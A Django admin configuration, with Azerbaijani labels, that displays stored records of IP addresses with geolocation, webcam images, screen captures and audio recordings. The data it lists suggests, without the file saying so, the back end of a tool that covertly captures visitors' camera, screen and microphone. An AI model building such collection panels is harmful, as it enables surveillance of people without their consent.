# from django.contrib import admin
# from django.utils.safestring import mark_safe
#
# from .models import IPInfo

#@admin.register(IPInfo)
# class IPInfoAdmin(admin.ModelAdmin):
#     list_display = ('ip', 'city', 'region', 'country', 'org', 'lat', 'lon', 'get_post_img','created_at')
#     readonly_fields = ('created_at',)
#
#
#
#     def get_post_img(self, obj):
#         if obj.image:  # Fayl varsa
#             return mark_safe(f"<img src='{obj.image.url}' width='50' />")
#         return "Yoxdur"
#
#     get_post_img.short_description = 'image'


from django.contrib import admin
from django.utils.safestring import mark_safe
from .models import IPInfo


@admin.register(IPInfo)
class IPInfoAdmin(admin.ModelAdmin):
    list_display = (
        'ip', 'city', 'region', 'country', 'org', 'lat', 'lon',
        'get_camera_image', 'get_screen_image', 'get_audio_player', 'created_at'
    )
    readonly_fields = ('created_at',)

    def get_camera_image(self, obj):
        if obj.camera_image:
            return mark_safe(f"<img src='{obj.camera_image.url}' width='50' />")
        return "Yoxdur"
    get_camera_image.short_description = 'Kamera Şəkli'

    def get_screen_image(self, obj):
        if obj.screen_image:
            return mark_safe(f"<img src='{obj.screen_image.url}' width='50' />")
        return "Yoxdur"
    get_screen_image.short_description = 'Ekran Görüntüsü'

    def get_audio_player(self, obj):
        if obj.audio:
            return mark_safe(f"""
                <audio controls>
                    <source src="{obj.audio.url}" type="audio/mpeg">
                    Sizin brauzer audio elementini dəstəkləmir.
                </audio>
            """)
        return "Yoxdur"
    get_audio_player.short_description = 'Səs Faylı'
